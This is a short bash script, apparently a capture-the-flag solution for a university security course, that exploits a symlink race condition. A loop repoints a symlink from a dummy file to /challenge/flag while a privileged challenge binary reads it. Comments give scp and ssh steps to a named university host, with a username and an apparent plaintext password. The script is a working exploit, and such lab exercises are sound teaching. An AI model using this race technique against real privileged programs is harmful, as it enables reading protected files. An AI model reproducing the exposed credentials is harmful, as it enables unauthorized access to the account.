#!/bin/bash

while true; do

    touch dum_p

    ln -sf dum_p pointer_p

    echo "pointer_p" | /challenge/challenge &

    ln -sf /challenge/flag pointer_p

done

# Steps to run:

# scp -P 23651 I_challenge_you_for_a_race.sh SSof_66@mustard.stt.rnl.tecnico.ulisboa.pt:/tmp/weird_dir

# ssh SSof_66@mustard.stt.rnl.tecnico.ulisboa.pt -p 23651
# dB2dX6R0ik

# cd tmp/weird_dir
# chmod +x I_challenge_you_for_a_race.sh
# ./I_challenge_you_for_a_race.sh | grep SSof

